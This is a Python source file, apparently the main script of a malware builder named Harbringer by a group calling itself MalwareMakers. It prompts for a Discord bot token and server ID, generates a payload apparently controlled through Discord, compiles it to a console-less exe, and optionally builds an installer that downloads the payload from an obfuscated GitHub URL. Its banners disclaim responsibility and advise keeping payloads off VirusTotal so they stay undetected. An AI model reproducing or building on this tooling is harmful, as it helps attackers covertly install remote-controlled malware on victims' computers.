# Made by MalwareMakers 
# Github : https://github.com/MalwareMakers
from rich.console import Console
from src.gen import *
from src.install_builder import *
import logging
from src.Functions import *
from rich.logging import RichHandler
import subprocess


FORMAT = "%(message)s"
logging.basicConfig(
    level="NOTSET",format=FORMAT,datefmt="[%X]", handlers=[RichHandler()]
)

log = logging.getLogger('rich')

class Banner:
    def __init__(self, text):
        self.text = text
    def print_banner(self):
        console = Console()
        console.print(self.text, style="red", justify="center")

class Data: 
    def __init__(self): 
        pass
    def Token(self): 
        console = Console()
        token = console.input("""
        [+] Discord Bot Token (make sure to enable messages intent and to invite the bot into your server with admin privs!)
        [+] Enter The Discord Bot Token: """)
        return token
    
    def Server_Id(self):
        console = Console()
        server_id =console.input("""
        [+] Server ID (submit the server id of your server, the one you have invited the bot into - if you dont know how to get the server id go here: https://www.alphr.com/discord-find-server-id/
        [+] Enter the Server ID: """)
        return server_id

    def GitHub_url(self):
        console = Console()
        Github_url =console.input("""
        [+] GitHub_url - upload the exe file of the paylaod to a repository, copy the link directly to the file - dont give the link to the repository!
        [+] Enter the GitHub Url: """)
        return Github_url

class Change_Compile: 
    def __init__(self,name):
        self.name = name

    def compile_to_exe(self):
        try:
            log.info("Compiling!")
            if self.name == "installer.py":
                subprocess.run(["pyinstaller", self.name,"--onefile", "--noconsole", "--hidden-import=pywintypes"], check=True)
            else:
                subprocess.run(["pyinstaller", "--onefile", "--noconsole", self.name], check=True)
            log.info("Compile succsessful!")
        except Exception as e:
            log.error("An error has occured!")
            print(str(e))


text = '''
 ██╗  ██╗ █████╗ ██████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ ███████╗██████╗ 
 ██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗
 ███████║███████║██████╔╝██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝
 ██╔══██║██╔══██║██╔══██╗██╔══██╗██╔══██╗██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗
 ██║  ██║██║  ██║██║  ██║██████╔╝██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
    Made By MalwareMakers        GitHub: https://github.com/MalwareMakers

    Any use of this software for malicious puposes or intent to cause
    harm in any form is not the responsiblity of the creator. I do not
    accept any responsiblity for the usage and possible damage cause 
    by this software!                                                
'''

thanks = '''
 ██╗  ██╗ █████╗ ██████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ ███████╗██████╗ 
 ██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗
 ███████║███████║██████╔╝██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝
 ██╔══██║██╔══██║██╔══██╗██╔══██╗██╔══██╗██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗
 ██║  ██║██║  ██║██║  ██║██████╔╝██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
    Made By MalwareMakers        GitHub: https://github.com/MalwareMakers

    Dont put the payloads into virus total, even if these are fud, those 
    av's are always developing and they use vt submissions to train!
'''

def main(): 
    console = Console()
    banner = Banner(text=text)
    banner.print_banner()
    info = Data()
    try:
        token = info.Token()  
        server_id = info.Server_Id()
        gen_payload = System_Gen(token=token,server_id=server_id)
        success,name = gen_payload.Make_payload()
        if success: 
            compile_payload = console.input("""
            [+] Would you like to compile the payload into an exe?
            [+] (Y/n): """)
            if compile_payload.lower() == "y" or compile_payload.lower() == "yes":
                compile = Change_Compile(name)
                compile.compile_to_exe()
                create_installer_v = console.input("""
                [+] Would you like to create an installer for the file? 
                [+] (Y/n): """)
                if create_installer_v.lower() == "y" or create_installer_v.lower() == "yes":
                    url = info.GitHub_url()
                    url_gen = Url_gen(url=url)
                    hidden_url,key_decode = url_gen.Gen()
                    builder_installer = Installer_Builder(github_url=hidden_url,key=key_decode)
                    success,name1 = builder_installer.Installer_gen()
                    if success: 
                        compile_installer = console.input("""
                [+] Would you like to compile the Installer into an exe?
                [+] (Y/n): """)
                        if compile_installer.lower() == "y" or compile_installer.lower() == "yes":
                            compile = Change_Compile(name=name1)
                            compile.compile_to_exe()
                        else: 
                            console.print(thanks, style="red", justify="center")
                    else: 
                        log.error("An error has occured!: uknown")
                else: 
                    console.print(thanks, style="red", justify="center")
            else:
                console.print(thanks, style="red", justify="center")
        else: 
            log.error("An error has occured!: uknown")
    except Exception as e: 
        log.error(f"An error has occured!: {str(e)}")
        print(str(e))

 
main()
